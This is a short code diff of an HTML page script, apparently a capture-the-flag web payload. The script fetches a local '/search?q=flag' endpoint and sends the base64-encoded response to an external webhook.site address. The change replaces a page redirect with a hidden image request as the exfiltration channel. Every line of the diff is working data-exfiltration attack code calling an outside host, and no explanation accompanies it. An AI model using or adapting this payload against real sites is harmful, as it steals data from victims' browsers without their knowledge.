@@ -5,7 +5,9 @@
       fetch("http://127.0.0.1:5000/search?q=flag")
         .then(res => res.text())
         .then(data => {
-          location.href = "https://webhook.site/ba5ed2dc-0a06-4151-84dd-432789909b1c?data=" + btoa(data);
+          const i = document.createElement("img");
+          i.src = "https://webhook.site/ba5ed2dc-0a06-4151-84dd-432789909b1c?data=" + btoa(data);
+          document.body.appendChild(i);
         });
     </script>
   </body>
